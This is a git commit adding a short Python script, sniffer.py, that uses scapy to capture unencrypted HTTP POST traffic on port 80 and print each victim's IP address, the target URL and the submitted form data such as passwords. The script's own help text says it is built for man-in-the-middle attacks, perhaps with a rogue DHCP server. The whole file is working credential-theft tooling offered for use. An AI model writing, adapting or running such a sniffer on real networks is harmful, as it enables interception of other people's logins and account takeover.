0668f63f5ea206f9a850af82ab9a1963b5e1a8b3
juanga333 <juangaruiz19@gmail.com>
2020-11-24 13:07:22 +0100

    First commit

---
+++ sniffer.py
@@ -0,0 +1,25 @@
+import argparse
+from scapy.layers.http import HTTPRequest
+from scapy.layers.inet import IP
+from scapy.packet import Raw
+from scapy.sendrecv import sniff
+
+
+def credentialsSniffing(packet):
+    if packet.haslayer(HTTPRequest) and packet.haslayer(Raw) and packet[HTTPRequest].Method.decode() == "POST":
+        if packet.getlayer(Raw):
+            try:
+                url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+                ipVictim = packet[IP].src
+                credentials = packet[Raw].load.decode("utf-8")
+                print("[*] From: ", ipVictim, credentials, url)
+            except:
+                pass
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="This script is a plain text credentials sniffer. It will show you HTTP POST. "
+                                                 "It is developed to be used in man in the middle attacks (maybe with a dhcp server?). "
+                                                 "If you are using it with a dhcp server, you need to enable forwarding.")
+    print("Sniffing...")
+    sniff(filter="tcp and (port 80)", prn=credentialsSniffing)
